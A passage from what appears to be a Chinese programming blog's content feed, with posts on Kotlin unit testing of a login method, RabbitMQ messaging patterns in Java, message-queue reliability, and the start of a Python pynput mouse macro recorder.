单元测试一般要覆盖各种边界值，比如这里的login()业务示例代码中，需要根据用户当前的启用和删除状态，以及所属商家的启用和删除状态进行登录限制。我们要模拟这些不同的数据进行输入，并且将输出的结果和预期的结果进行对比验证。 测试数据测试数据这里用了一个Excel文件进行存放。对用户和所属商户的启用禁用的各种情况进行模拟不同的用户数据，第一行表头部分作为后续单元测试读取的键名称，expected为这条数据登录后应该返回的期望状态，单元测试程序需要对比期望状态和实际调用login方法所返回的状态，如果相同则表明测试通过，如果不同则表明login()方法有逻辑问题。测试数据中包含了实际的业务场景，用户和所关联的商户必须都为未删除状态，且都必须是启用状态用户才能成功登陆。 编写单元测试123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package com.lanshiqin.bootimport com.nhaarman.mockito_kotlin.mockimport org.mockito.Mockito.`when`import org.springframework.core.io.ClassPathResourceimport org.testng.Assert.assertEqualsimport org.testng.annotations.BeforeMethodimport org.testng.annotations.DataProviderimport org.testng.annotations.Testclass UserControllerTest &#123; private var userController: UserController? = null private var userService: MerUserService? = null private var i18NService: I18NService? = null @BeforeMethod fun setUp() &#123; userController = UserController() userService = mock() i18NService = mock() userController!!.userService = userService as MerUserService userController!!.i18NService = i18NService as I18NService &#125; @DataProvider(name = "loginDataInfo") fun loginDataInfo(): Array&lt;Array&lt;Any&gt;&gt; &#123; // 加载用户登录测试数据，包含各种边界值 return ExcelUtil().testData(ClassPathResource("loginDataInfo.xls").file.path) &#125; // 登录 @Test(dataProvider = "loginDataInfo") fun testLogin(data: HashMap&lt;String, String&gt;) &#123; // 行为mock，当调用i18NService!!.getI18N("mer.coupon.accountError")方法时将会返回 “账号异常” `when`(i18NService!!.getI18N("mer.coupon.accountError")).thenReturn("账号异常") `when`(i18NService!!.getI18N("mer.coupon.userError")).thenReturn("用户名或密码错误") `when`(i18NService!!.getI18N("mer.coupon.loginError")).thenReturn("登录失败") // 构造测试数据，用户登录信息 val request = UserLoginRequest() request.username = data["reqUserName"].toString() request.password = data["reqPassWord"].toString() // 构造测试数据 val response = CoMerUserResponse() response.userName = data["userName"].toString() val password = data["password"].toString() response.userDelete = data["userDelete"]!!.toInt() response.merDeleted = data["merDeleted"]!!.toInt() response.userAvalible = data["userAvalible"]!!.toInt() response.merAvalible = data["merAvalible"]!!.toInt() // Mock userService.getUser(），返回测试对象 `when`(userService!!.getUser(request.username!!, password)).thenReturn(response) // 调用userController.login()方法 val result = userController!!.login(request) // 验证预期返回值和实际返回值 assertEquals(data["expected"].toString(),result.message) &#125;&#125; @DataProvider(name=&quot;loginDataInfo&quot;)所标注的方法表示该方法是一个数据提供者，指定名称为loginDataInfo。@Test(dataProvider=&quot;loginDataInfo&quot;)所标注的单元测试方法表示，该方法执行单元测试前将会先执行数据提供者loginDataInfo所标注的方法，将数据提供者方法返回的数据作为本单元测试的入参。 注：单元测试代码中的when使用引号引起来是因为单元测试的when方法和kotlin的关键字when冲突了，所以必须加上单引号 执行单元测试 根据测试数据中的边界值执行单元测试，每条数据所返回的结果与预期结果相同，测试通过！ 后续如果不小心修改了UserController.login()中的方法，比如不小心将业务代码中23行的的user.userDelete == 1改成了 user.userDelete == 0，这时候再运行一遍单元测试就会发现有一部分单元测试就无法通过了，通过预期值和实际值可以很容易的发现问题。 在实际业务场景中，一个方法可能调用了多个外部方法，并且根据外部方法不同的返回值执行不同的逻辑。每个方法应该只关注自身的逻辑，所调用的外部方法以及返回值我们要通过Mock进行构造，并且应该尽可能的覆盖所有的边界情况，在特别复杂的业务代码中，单元测试显得至关重要。写完测试后，即使后续动到了核心的业务代码，只需要运行一遍单元测试就能判断逻辑是否有问题，而不是通过一遍一遍的断点调试，做重复的工作。]]></content>
  </entry>
  <entry>
    <title><![CDATA[RabbitMQ知识点梳理]]></title>
    <url>%2Ff9e910b8%2F</url>
    <content type="text"><![CDATA[RabbitMQ是一个开源的消息代理程序，实现了高级消息队列协议（AMQP）并且可以通过插件的方式进行扩展，使其支持STOMP和MQTT等协议，是目前应用最为广泛的面向消息的中间件之一。RabbitMQ支持各种主流的编程语言，比如Python、Java、C#、Go、Swift等，并且可以在各种操作系统平台上运行，通过扩展的MQTT协议可以很轻量的在移动设备上实现消息推送，早期的Android推送服务就是采用MQTT的方式进行消息订阅和推送的。 在开始之前，先对消息队列（MQ）的各个名词和定义等基本概念进行一下基本的认识。 基本概念producer producer（生产者），发送消息的程序代表生产者，生产者只进行消息的发送，可以用首字母P来表示。 queue queue（队列），这里的队列指的是消息队列，消息队列的本质是一个消息缓冲区，消息队列把消息存储在主机的内存和磁盘上。多个生产者可以往一个队列发送数据，多个消费者可以从一个队列接收数据，每个队列都有一个名称。 consumer consumer（消费者），是一个等待接收消息的程序，从消息队列接收数据的程序代表消费者，用首字母C来表示。 生产者、消费者与MQ不必运行在同一个主机上，可以分布在不同的主机上。由于RabbitMQ支持各种编程语言，所以生产者和消费者可以使用不同的编程语言进行实现，消息中间件使异构系统的实现变得更加简化，并且一个程序可以同时既是生产者又是消费者。 简单使用创建一个生产者项目用来向消息队列发送数据，创建一个消费者项目用来从消息队列里接收数据，消费者需要注册到指定到MQ队列中，如下图所示：在开始之前，需要先从RabbitMQ到官网下载RabbitMQ服务进行安装并启动服务，并且根据自己所用到开发语言下载操作RabbitMQ所需要的驱动程序，由于我使用Gradle构建项目，所以不必自己下载和管理jar包，只需要引入以下依赖即可：1compile group: 'com.rabbitmq', name: 'amqp-client', version: '5.6.0' 生产者导入需要用到的类：123import com.rabbitmq.client.ConnectionFactory;import com.rabbitmq.client.Connection;import com.rabbitmq.client.Channel; ConnectionFactory 连接工厂类，提供了各种属性用来设置连接到MQ的参数，从工厂类获取连接对象。 Connection 连接对象接口类，通过connectionFactory.newConnection()获取到一个连接对象。 Channel 通道，通过connection.createChannel()创建通道对象，Channel提供了操作MQ的各种API。 定义队列名称1private static final String QUEUE_NAME = "hello"; 要将消息发送到具体的队列上，需要为每个队列指定名称用来区分。 创建连接发送数据123456789101112ConnectionFactory connectionFactory = new ConnectionFactory();connectionFactory.setHost("localhost");try(Connection connection = connectionFactory.newConnection())&#123; Channel channel = connection.createChannel(); // 声明队列（队列名称，非持久化，非独占，不自动删除队列，空参数） channel.queueDeclare(QUEUE_NAME,false,false,false,null); // 定义消息 String message = "Hello,World!"; // 发送消息（exchange，routingKey，其他属性，消息正文） channel.basicPublish("",QUEUE_NAME,null,message.getBytes()); System.out.println(" [x] Send '" + message + "'");&#125; 由于RabbitMQ服务安装在本机，所以代码里只需要设置connectionFactory.setHost(&quot;localhost&quot;);,其他属性会使用默认值，RabbitMQ默认通信端口5672,用户guest，密码guest，如果安装了RabbitMQ管理插件，可通过15672端口进入后台管理页面。如果修改了RabbitMQ服务的配置参数值，就需要在程序中设置对应的属性值，比如：12345connectionFactory.setPort(56723);connectionFactory.setUsername("admin");connectionFactory.setPassword("********");connectionFactory.setVirtualHost("app_message");// ... 在使用Channel发送数据前，需要通过channel.queueDeclare()方法为该Channel定义队列声明。queueDeclare()方法定义如下：12345678910111213/** * 声明队列 * * @param queue 队列名称 * @param durable true表示持久队列，队列将会在MQ服务重启后继续存在 * @param exclusive true表示队列独占（仅限于该链接） * @param autoDelete true表示自动删除队列（服务器不再使用时删除该队列) * @param arguments 队列的其他属性 * @return 队列成功声明返回 Queue.DeclareOk * @throws java.io.IOException 如果有错误抛出IOException */Queue.DeclareOk queueDeclare(String queue, boolean durable, boolean exclusive, boolean autoDelete, Map&lt;String, Object&gt; arguments) throws IOException; 注意：队列不允许重复定义一个队列用队列名称进行标识，一旦队列初始化声明后就不允许定义成其他属性值，比如：12345// 程序A：声明队列（队列名称，非持久化，非独占，不自动删除队列，空参数）channel.queueDeclare(QUEUE_NAME,false,false,false,null);// 程序B：声明队列（队列名称，持久化，独占，自动删除队列，空参数）channel.queueDeclare(QUEUE_NAME,true,true,true,null); 由于程序A已经定义并且初始化了队列，程序B重新初始化不一样的属性值会导致异常。 如果要重新声明队列属性，需要将已经声明的队列删除，可以进入管理后台进行删除操作。 在使用Channel发送数据时，通过channel.basicPublish()方法发送数据。根据队列的不同性质，传入的参数也不同。basicPublish()方法定义如下：12345678910/** * 发布消息 * * @param exchange 消息要发送到哪个exchange上 * @param routingKey 路由key * @param props 其他属性 * @param body 消息正文 * @throws java.io.IOException 如果有错误抛出IOException */void basicPublish(String exchange, String routingKey, BasicProperties props, byte[] body) throws IOException; 消费者导入需要用到的类：1234import com.rabbitmq.client.ConnectionFactory;import com.rabbitmq.client.Connection;import com.rabbitmq.client.Channel;import com.rabbitmq.client.DeliverCallback; 定义队列名称1private static final String QUEUE_NAME = "hello"; 队列名称要实际存在，要和对应的生产者发布数据的队列名称一致，否则无法接受生产者所发送的数据。 创建连接接收数据12345678910111213141516ConnectionFactory connectionFactory = new ConnectionFactory();connectionFactory.setHost("localhost");try(Connection connection = connectionFactory.newConnection())&#123; Channel channel = connection.createChannel(); // 声明队列（队列名称，非持久化，非独占，不自动删除队列，空参数） channel.queueDeclare(QUEUE_NAME,false,false,false,null); System.out.println(" [*] Waiting for messages. To exit press CTRL+C"); // 消费者接收到队列投递的回调（consumerTag 服务端生成的消费者标识，delivery投递） DeliverCallback deliverCallback = (consumerTag, delivery) -&gt; &#123; // 获取消息内容并输出 String message = new String(delivery.getBody(), StandardCharsets.UTF_8); System.out.println(" [x] Received '" + message + "'"); &#125;; // 开启消费者监听 channel.basicConsume(QUEUE_NAME,true,deliverCallback,consumerTag -&gt; &#123;&#125;);&#125; 消费者和生产者一样，需要声明队列。因为消费者程序的启动可能早于生产者，声明队列可以初始化队列信息，确保队列存在。消费者通过监听指定队列进行数据消费。通过basicConsume()方法开启一个消费者监听，监听回调使用DeliverCallback进行处理。DeliverCallback()方法定义如下： 12345678910/** * 服务端生成的消费者标识，启动非本地、非独占的消费者 * @param queue 队列名称 * @param autoAck 设置为true消费者接收消息后会自动发送一个ACK消息给服务器确认，false不会自动发送确认消息给服务器 * @param deliverCallback 消息传递时回调 * @param cancelCallback 取消消费者时的回调 * @return 服务端生成的消费者标识 * @throws IOException 如果有错误抛出IOException */ String basicConsume(String queue, boolean autoAck, DeliverCallback deliverCallback, CancelCallback cancelCallback) throws IOException; 无论是生产者还是消费者，使用完消息队列后，都需要先关闭通道channel.close()，然后再关闭连接对象connection.close()。上面的代码示例使用了try(){}代码块对资源进行自动回收。 Work queues Work queues 工作队列也称为任务队列，主要思想是避免立即执行资源密集型的任务。将需要执行的任务放到消息队列中，等待资源空闲时消费者从消息队列中取出消息并逐个执行。 工作队列适用于很多场景，一般的使用方式也都是采用任务队列。一个生产者对应多个消费者，并且消费者要处理耗时的任务，所以这里的消息机制需要做一些修改 自动确认消息改为手动确认12boolean autoAck = false;channel.basicConsume(QUEUE_NAME,autoAck,deliverCallback,consumerTag -&gt; &#123;&#125;); 一个生产者对多个消费者，生产者必须公平的保证一条消息发送给每一个消费者，所以要把消费者接收自动确认 autoAck改成false。 手动确认消息可以防止某个生产者发送Ack导致MQ中的消息被删除，但是不能保证MQ不丢消息，比如突然断电MQ重启,为了让MQ能够持久化消息，在初始化队列的时候需要指定队列durable属性值为true,开启消息持久化。12boolean durable = true;channel.queueDeclare(QUEUE_NAME,durable,false,false,null); 队列开启持久化后仍然不一定能够保证在极端情况下不丢失数据，整个MQ从消息的发送，中转，再到接收都需要严格把控。所以如果要彻底防止丢失消息，需要在生产者发送消息时做发布确认。 Publish/Subscribe Publish/Subscribe 发布订阅模式，将消息广播发送给所有消费者。这里以日志系统为例，假设生产者程序将消息发送给两个消费者，其中一个消费者负责将日志输出到控制台，另外一个消费者负责将日志写入到磁盘。在发布订阅模式中有个很重要的概念 Exchanges Exchanges 生产者时发生消息的用户应用程序。消息队列是存储消息的缓存区。消费者是接收消息的用户应用程序。在RabbitMQ的消息传递模型中，他的核心思想是生产者永远不会将任何消息直接发送到队列上，甚至不知道消息是否被传递到任何队列。 生产者向Exchanges发送消息。 Exchanges负责生产者消息的接收，将消息推送到队列。Exchanges 通过exchange type指定的类型明确要如何处理消息，比如附加到特定队列或者所有队列，或者将消息丢弃。 命令行执行如下命令，查看目前RabbitMQ中的Exchanges1rabbitmqctl list_exchanges 也可以通过访问RabbitMQ的网页管理后台,默认地址http://localhost:15672/#/exchanges进行查看 消息发布者通过 exchange发送消息示例：123456789101112131415161718192021222324252627282930public class PublishSample &#123; // 自定义 exchange private static final String EXCHANGE_NAME = "logs"; public static void main(String[] args) &#123; ConnectionFactory connectionFactory = new ConnectionFactory(); connectionFactory.setHost("localhost"); try(Connection connection = connectionFactory.newConnection())&#123; Channel channel = connection.createChannel(); String message = "Hello,World!"; // 指定exchange的类型为fanout channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.FANOUT); // 向指定exchange发送消息 channel.basicPublish(EXCHANGE_NAME,"",null,message.getBytes(StandardCharsets.UTF_8)); System.out.println(" [x] Send '" + message + "'"); &#125; catch (TimeoutException | IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 通过对比简单使用MQ的代码发现，生成者不直接发送消息到队列，所以不需要声明队列语句:12// 声明队列（队列名称，非持久化，非独占，不自动删除队列，空参数）channel.queueDeclare(QUEUE_NAME,false,false,false,null); 使用exchange的方式发送消息到消息队列，需要指定exchange和对应的类型12// 指定exchange的类型为fanoutchannel.exchangeDeclare(EXCHANGE, BuiltinExchangeType.FANOUT); 通过查看枚举类可知，exchange可指定的类型有:1DIRECT("direct"), FANOUT("fanout"), TOPIC("topic"), HEADERS("headers"); 当类型为fanout时，将忽略routingKey参数向exchange发送消息：12// 向指定exchange发送消息，由于是fanout类型，所以自动忽略第二个参数 routingKey的值channel.basicPublish(EXCHANGE,"",null,message.getBytes()); 对比本章的基础使用部分:12// 发送消息（exchange，路由key，路由其他属性，消息正文）channel.basicPublish("",QUEUE_NAME,null,message.getBytes()); 基础使用部分的代码示例中，直接向MQ队列名称发送消息，其中exchange的参数为一个空字符串&quot;&quot;表示默认或者匿名交换，消息将通过第二个参数routingKey指定的队列名称路由到队列（如果队列存在的话）。 订阅者代码示例：123456789101112131415161718192021222324252627282930313233343536373839public class SubscribeSample &#123; // 自定义 exchange private static final String EXCHANGE_NAME = "logs"; public static void main(String[] args) &#123; ConnectionFactory connectionFactory = new ConnectionFactory(); connectionFactory.setHost("localhost"); try(Connection connection = connectionFactory.newConnection())&#123; Channel channel = connection.createChannel(); // 指定exchange的类型为fanout channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.FANOUT); // 获取队列，得到一个随机名称（非持久化的自动删除队列） String queueName = channel.queueDeclare().getQueue(); System.out.println(queueName); // 绑定消息队列和exchange channel.queueBind(queueName,EXCHANGE_NAME,""); System.out.println(" [*] Waiting for messages. To exit press CTRL+C"); DeliverCallback deliverCallback = (consumerTag, message) -&gt; &#123; String messages = new String(message.getBody(), StandardCharsets.UTF_8); System.out.println(" [x] Received '" + messages +"'"); &#125;; channel.basicConsume(queueName,true,deliverCallback, consumerTag -&gt; &#123;&#125;); &#125; catch (TimeoutException | IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 生产者通过发送消息到交换机exchange，消费者从channel中获取一个随机的非持久化自动删除队列:12// 获取队列，得到一个随机名称（非持久化的自动删除队列）String queueName = channel.queueDeclare().getQueue(); 并且将该队列绑定到指定的exchange上12// 绑定消息队列和exchangechannel.queueBind(queueName,EXCHANGE_NAME,""); 关系图如下： 注意：消费者必须先绑定到exchange上，然后生产者再发送消息，否则exchange无法将消息路由到任何队列。消费者接收消息后自动确认消息并且自动删除队列。 Routing Routing 路由，进行有选择的接收消息，可以订阅某个消息队列的子集。 生产者代码：1234567891011// 指定exchange的类型为directchannel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.DIRECT);// 向指定exchange发送消息，路由key为 infochannel.basicPublish(EXCHANGE_NAME,"info",null,"info message".getBytes(StandardCharsets.UTF_8));// 向指定exchange发送消息，路由key为 warningchannel.basicPublish(EXCHANGE_NAME,"warning",null,"warning message".getBytes(StandardCharsets.UTF_8));// 向指定exchange发送消息，路由key为 errorchannel.basicPublish(EXCHANGE_NAME,"info",null,"error message".getBytes(StandardCharsets.UTF_8)); 消费者代码：1234567891011121314// 指定exchange的类型为directchannel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.DIRECT);// 获取队列，得到一个随机名称（非持久化的自动删除队列）String queueName = channel.queueDeclare().getQueue();// 绑定消息队列、exchange、路由key为errorchannel.queueBind(queueName,EXCHANGE_NAME,"error");// 绑定消息队列、exchange、路由key为info// channel.queueBind(queueName,EXCHANGE_NAME,"info");// ...// 接收指定exchange中routingKey为error的消息并处理 生产者可以绑定多个routingKey，发送到类型为direct的exchange消费者可以为一个队列绑定多个routingKey，关系图如下所示： Topics Topics 主题，基于主题交换的策略接收消息。 基于Topics的方式可以让消息队列的使用更加灵活，为消息的发送和订阅提供更加细粒度的控制首先需要指定exchange的类型为topic，在生产者发送消息时设置 routingKey为一个符号表达式。routingKey的格式必须是由点.分割的单词列表，单词可以是任何内容，通常用与消息相关的单词来表示比如：sys.info.log、*.info.log、lazy.#、*.*.info.#等* 一个字符占位符# 0个或者多个字符的占位符生产者代码：12345678// 指定exchange的类型为topicchannel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.TOPIC);// 向指定exchange发送消息, routingKey 为 s.info.l， 订阅的消费者需要指定主题routingKey为 *.info.* 或者 #.info.#channel.basicPublish(EXCHANGE_NAME,"s.info.l",null,"info message".getBytes(StandardCharsets.UTF_8));// 向指定exchange发送消息, routingKey 为 lazy.test.one, 订阅的消费者需要指定主题routingKey为 lazy.#channel.basicPublish(EXCHANGE_NAME,"lazy.test.one",null,"lazy message".getBytes(StandardCharsets.UTF_8)); 消费者代码：123456789// 指定exchange的类型为topicchannel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.TOPIC);// 获取队列，得到一个随机名称（非持久化的自动删除队列）String queueName = channel.queueDeclare().getQueue();// 绑定消息队列和exchangechannel.queueBind(queueName,EXCHANGE_NAME,"*.info.*");// 消费者将会收到生产者发送的 info message 消息内容 RPC RPC 远程过程调用，RabbitMQ也支持这种同步调用的特性，调用之后等待调用结果返回。 客户端通过RabbitMQ的RPC调用服务端，等待服务端返回结果，示例程序如下： 客户端12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class RPCClient implements AutoCloseable &#123; private Connection connection; private Channel channel; private String requestQueueName = "rpc_queue"; public RPCClient() throws IOException, TimeoutException &#123; ConnectionFactory connectionFactory = new ConnectionFactory(); connectionFactory.setHost("localhost"); connection = connectionFactory.newConnection(); channel = connection.createChannel(); &#125; public static void main(String[] args) &#123; try(RPCClient fibonacciRpc = new RPCClient())&#123; for (int i = 0; i &lt; 32; i++)&#123; String i_str = Integer.toString(i); System.out.println(" [x] Requesting fib(" + i_str +")"); String response = fibonacciRpc.call(i_str); System.out.println(" [.] Got '" + response + "'"); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public String call(String message) throws IOException, InterruptedException &#123; final String corrId = UUID.randomUUID().toString(); String replayQueueName = channel.queueDeclare().getQueue(); AMQP.BasicProperties basicProperties = new AMQP.BasicProperties .Builder() .correlationId(corrId) .replyTo(replayQueueName) .build(); channel.basicPublish("",requestQueueName,basicProperties,message.getBytes(StandardCharsets.UTF_8)); final BlockingQueue&lt;String&gt; response = new ArrayBlockingQueue&lt;&gt;(1); String cTag = channel.basicConsume(replayQueueName,true,(consumeTag, delivery)-&gt;&#123; if (delivery.getProperties().getCorrelationId().equals(corrId))&#123; response.offer(new String(delivery.getBody(),StandardCharsets.UTF_8)); &#125; &#125;,consumerTag -&gt; &#123; &#125;); String result = response.take(); channel.basicCancel(cTag); return result; &#125; @Override public void close() throws Exception &#123; connection.close(); &#125;&#125; 服务端1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162public class RPCServer &#123; private static final String RPC_QUEUE_NAME = "rpc_queue"; private static int fib(int n)&#123; if (n == 0) return n; if (n == 1) return n; return fib(n-1) + fib(n-2); &#125; public static void main(String[] args) &#123; ConnectionFactory connectionFactory = new ConnectionFactory(); connectionFactory.setHost("localhost"); try(Connection connection = connectionFactory.newConnection())&#123; Channel channel = connection.createChannel(); channel.queueDeclare(RPC_QUEUE_NAME,false,false,false,null); channel.queuePurge(RPC_QUEUE_NAME); channel.basicQos(1); System.out.println(" [x] Awaiting PRC request"); Object monitor = new Object(); DeliverCallback deliverCallback = (consumerTag, message) -&gt; &#123; AMQP.BasicProperties replyProperties =new AMQP.BasicProperties .Builder() .correlationId(message.getProperties().getCorrelationId()) .build(); String response = ""; try&#123; String theMessage = new String(message.getBody(), StandardCharsets.UTF_8); int n = Integer.parseInt(theMessage); System.out.println(" [.] fib(" + n + ")"); response += fib(n); &#125;catch (Exception e)&#123; System.out.println(" [.] " + e.toString()); &#125;finally &#123; channel.basicPublish("",message.getProperties().getReplyTo(),replyProperties,response.getBytes(StandardCharsets.UTF_8)); channel.basicAck(message.getEnvelope().getDeliveryTag(),false); synchronized (monitor)&#123; monitor.notify(); &#125; &#125; &#125;; channel.basicConsume(RPC_QUEUE_NAME,false,deliverCallback,(consumeTag-&gt;&#123; &#125;)); while (true)&#123; synchronized (monitor)&#123; try &#123; monitor.wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; catch (TimeoutException | IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 注：本文章为RabbitMQ的学习笔记，文章中的图片和部分代码都来自RabbitMQ官网，官方文档地址：https://www.rabbitmq.com/getstarted.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[消息队列知识点梳理]]></title>
    <url>%2Fcb6b0010%2F</url>
    <content type="text"><![CDATA[消息队列（Message Queue）简称MQ，用于应用程序之间的消息传递，在消息中间件领域有着广泛的应用。高级消息队列协议（Advenced Message Queuing Protocol）简称（AMQP），是应用层协议的一个开放标准。AMQP协议可以使用任何编程语言实现，基于AMQP协议实现的中间件有：RabbitMQ、ActiveMQ、RocketMQ等。 基础部分使用消息队列的优点使用消息队列之前，可以先看看消息队列有什么优点，能够解决什么样的问题，也就是为什么要使用消息队列的原因 解耦使用消息队列前系统A直接调用系统B、系统C，调用代码是硬编码的，系统之间存在依赖耦合的关系。如果后续有新的系统需要接入到A系统中，那么就需要通过不断的修改A系统的代码来实现，不利于系统扩展。 使用消息队列后系统A不直接调用其他系统，而是将消息发送给消息队列，系统A不必关心有多少个系统会消费该消息。后续有新系统需要接入时，只需要订阅消息队列即可。 异步使用消息队列前系统A调用一个核心业务很快就完成了，但是后续还需要等待非核心业务完成后才通知用户执行成功，这样等待时间太久了用户会不耐烦。 使用消息队列后系统A在1ms内完成核心业务的调用并通知用户执行成功，整个过程用户只等待了1ms，很大程度的提高了用户体验。核心业务成功发送消息到MQ就算业务执行完成了，不必关心后面的非核心业务是否已经消费消息。在高并发的场景下也经常会使用到这种异步方式，可以对流量进行消峰，将非核心业务放到消息队列中滞后处理，等待资源空闲时从队列中取出消息逐个处理。 使用消息队列的缺点使用消息队列的优点同样也产生了相应的缺点，要足够了解所可能带来到风险并且根据实际业务场景合理规避风险。 解耦影响系统可用性引入了消息队列之后，由于各个系统之间采用消息队列进行通信，如果消息队列停止运行了，那么相当于整个架构体系内的系统都变成了不可用。 异步增加系统复杂性由于网络故障等原因，消费者在消费完成后没有发送确认消息给消息队列，消息队列认为消息没有送达而重复发送消息，导致订阅者收到多次相同到消息重复消费，这时就需要消费者自己处理重复消息。由于网络故障或者其他不可抗拒的外部因素，如何保证可靠性传输也是要解决的一个问题，主要体现在以下4个方面：防止重复消费的问题、防止生产者丢数据、防止消息队列丢数据、防止消费者丢数据。 针对消息队列的缺点如何进行完善如何保证高可用一般在生产环境中都会采用消息队列集群和主从模式来保证高可用，文章后半部分都以RabbitMQ的实现方式为例。 如何防止重复消费的问题解决这个问题之前先考虑一下，为什么会收到重复消息？这里以RabbitMQ为例，正常情况下，消费者在消费完消息之后都会给消息队列发送一个确认信息，消息队列收到该确认信息后会将该消息删除，因为网络故障等原因，消息队列没有收到消费者的确认信息，导致消息队列继续存在该消息，并且下次会重复被消费。解决的方式可以根据实际业务场景来决定： 业务系统接收到消息之后一般会有入库操作，将消息的id作为记录主键，一旦收到重复消息就会抛出主键插入异常。 业务系统将消息处理结果存储到redis中，同样使用消息的id作为key，即使收到同样的消息set了多次也只会有一条消息，因为消息id一样，所以无论设置多少次都会保证幂等性。 采用redis的key-value方式做一个消费记录，消费者收到消息后先拿消息id去消费记录里查找，如果查找到了说明已经被消费过了就不处理相关业务，如果消息记录里没有该消息的id，则将该消息set到redis记录中，并进行相关业务处理。如何保证传输的可靠性要保证传输可靠性，就要考虑到整个消息队列前后有可能发生到问题并进行处理。防止生产者丢消息生产者将消息发送到消息队列到过程中，由于网络故障等因素导致消息队列无法接受到消息。RabbitMQ提供了两种解决方案： transactiontransaction模式采用事务的方式保证生产者消息成功送达到消息队列。发消息前先开启事务，然后再发送消息，发送的过程中如果异常就执行回滚，成功就提交事务。 confirm采用transaction模式的缺点是每次发送消息前都要先开启事务，这种操作理论上会降低消息队列的吞吐量。confirm模式相比transaction模式有着更高的吞吐量，一旦生产者将消息投递到所有匹配到消息队列之后，RabbitMQ就会发送一个ACK给生产者，使生产者知道消息已经正确到达目的队列了。如果没有送达消息队列，消息队列会发送一个Nack消息给生产者，生产者接收到该消息后可以决定是否进行重发。防止消息队列丢消息开启持久化磁盘，并配合Confirm，消息持久化到磁盘后再给生产者发一个ACK信号，如果持久化磁盘之前MQ就停止运行了，生产者收不到ACK信号会自动进行重发。MQ如果一直停止运行，生产者根据业务场景进行多次重试仍然发送失败，生产者应该实现报警并记录日志。防止消费者丢消息消费者收到消息队列的消息后会自动发送一个ACK确认消息给消息队列。在接收到消息并发送确认收到信息后，由于消费者自身的业务异常导致消息没有被合理的处理，导致消息丢失。可以根据实际的业务场景，将自动发送确认消息改为手动发送，在消费者业务代码正常执行完成之后再手动确认消息。]]></content>
  </entry>
  <entry>
    <title><![CDATA[使用Python实现一个按键精灵]]></title>
    <url>%2F2fb233e2%2F</url>
    <content type="text"><![CDATA[按键精灵想必很多人都玩过，使用录制功能将鼠标和键盘的操作录制下来，录制好后就可以通过回放自动执行之前录制的操作，可以设置重复执行的次数，这样就可以将一些重复的劳动交给脚本自动化去完成。使用Python编写一个和脚本精灵一样的程序非常简单，并且代码量足够少，好处是可以不再依赖按键精灵，像我这种有轻微洁癖的程序猿就喜欢自己动手实现,依赖Python的为所欲为的特性，可以任意编码让自己的按键精灵更加强大。按键精灵的实现可以拆解分为录制和回放两个步骤，对应到Python程序的实现也可以分为两步：1.监听鼠标键盘的事件和坐标，写入到文件中记录起来。2.读取监听时写入的文件，执行文件中的坐标和事件操作。 要实现这两个功能，得先从基础开始。我把任务拆解成两大部分，鼠标和键盘属于不同的两个输入设备，所以分开实现“鼠标精灵”和“键盘精灵”两个程序，最后融合这两个模块实现一个相对完整的按键精灵。 Python操作键盘鼠标的库推荐pynput这个库、地址：https://pypi.org/project/pynput/ 鼠标事件监听123456789101112131415161718192021from pynput import mouse# 鼠标移动事件def on_move(x, y): print('[Move]', (x, y))# 鼠标点击事件def on_click(x, y, button, pressed): print('[Click]', (x, y, button.name, pressed))# 鼠标滚动事件def on_scroll(x, y, x_axis, y_axis): print('[Scroll]', (x, y, x_axis, y_axis))# 监听事件绑定with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener: listener.join() onMove(x,y)函数接收鼠标当前的x轴和y轴坐标，启动程序并移动鼠标时，就会调用该方法。on_click(x, y, button, pressed)函数接收鼠标的点击事件，x和y为当前点击事件的鼠标坐标，button参数对象的name属性值为left或者right,通过该属性值可以判断是鼠标的左键还是右键产生的点击事件。pressed参数值为True时表示当前鼠标左或右键按压，False时表示鼠标左或右键抬起事件on_scroll(x, y, x_axis, y_axis)接收四个参数，前两个参数依旧是当前事件的鼠标坐标轴，x_axis的值&gt;0表示向上，&lt;0表示向下，同样的y_axis的负值和正值代表左滑和右滑状态。当 鼠标事件执行12345678910111213141516171819202122232425262728293031323334353637from pynput.mouse import Button, Controllerimport time# 获取鼠标对象mouse = Controller()# 输出鼠标当前的坐标print(mouse.position)# 将新的坐标赋值给鼠标对象mouse.position = (100, 500)for index in range(0, 30): # 鼠标移动到指定坐标轴 mouse.move(index, -index) print(mouse.position) time.sleep(0.01)for index in range(0, 30): # 鼠标移动到指定坐标轴 mouse.move(-index, index) print(mouse.position) time.sleep(0.01)# 鼠标右键按下mouse.press(Button.right)time.sleep(0.01)# 鼠标右键抬起mouse.release(Button.right)# 鼠标左键点击mouse.click(Button.left, 1)# 鼠标滚轮滚动距离500mouse.scroll(0, 500) 和鼠标事件监听一样，对应的我们可以操作鼠标的各种事件：移动、左/右按压、左/右抬起、左/右点击、上下左右滚动上面代码中的mouse.move(x,y)函数，表示从当前鼠标位置进行位移的距离，x和y的值是以当前位置为0点开始算的。而且不能简单的用坐标轴去相减得到位移距离，所以后续的程序我会使用mouse.position = (x, y)这个函数来操作鼠标的移动，这个函数可以将鼠标设置到指定位置，只要我们记录之前的鼠标移动轨迹，就可以通过读取之前的记录文件按顺序重新对鼠标进行赋值操作。达到回放的效果。 带录制回放功能的鼠标精灵结合鼠标事件的监听和执行，并且将事件记录到文件中，再加上Python自带的GUI，就可以写出一个简单的鼠标精灵了。实现思路： 定义一个json格式的对象来统一不同鼠标事件的内容格式12345678910&#123; "name":"mouse", "event":"click", "target":"left", "action":true, "location":&#123; "x":"0", "y":"0" &#125;&#125; 